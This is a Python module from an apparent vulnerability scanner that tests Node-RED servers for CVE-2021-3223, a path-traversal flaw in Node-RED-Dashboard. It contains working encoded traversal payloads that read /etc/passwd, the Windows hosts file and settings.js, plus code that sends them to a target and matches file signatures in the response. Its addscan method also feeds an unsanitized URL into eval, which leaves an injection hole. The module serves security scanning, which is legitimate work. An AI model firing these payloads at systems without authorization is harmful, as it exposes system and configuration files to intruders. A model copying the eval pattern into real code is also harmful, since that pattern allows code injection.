#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Node-RED是一种编程工具, 事件驱动应用程序的低代码编程, 用于以新颖有趣的方式将硬件设备、API和在线服务连接在一起: https://nodered.org/
    Node-RED扫描类: 
        1. Node-RED 任意文件读取
            CVE-2021-3223
                Payload: https://blog.csdn.net/weixin_51387754/article/details/121532015

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class NodeRED():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Node-RED'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_3223_payloads = [
            {
                'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
                'data': ''
            },
            {
                'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts',
                'data': ''
            },
            {
                'path': 'ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts',
                'data': ''
            },
            {
                'path': 'ui_base/js/..%2f..%2f..%2f..%2fsettings.js',
                'data': ''
            }
        ]

    def cve_2021_3223_scan(self, url):
        ''' Node-RED由于未对url中传输的路径进行严格过滤, 导致攻击者可构造特殊路径进行任意文件读取
                Node-Red-Dashboard version < 2.26.2
                (Node-Red插件Node-Red-Dashboard, 如果未安装此插件, 或插件版本高于2.26.2, 则不受影响)
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'File-Read'
        vul_info['vul_id'] = 'CVE-2021-3223'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2021_3223_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
                or ('Microsoft Corp' in res.text) 
                or ('Microsoft TCP/IP for Windows' in res.text)
                or ('To password protect the Node-RED editor and admin API' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_3223_scan, url=url)
        ]

nodered = NodeRED()
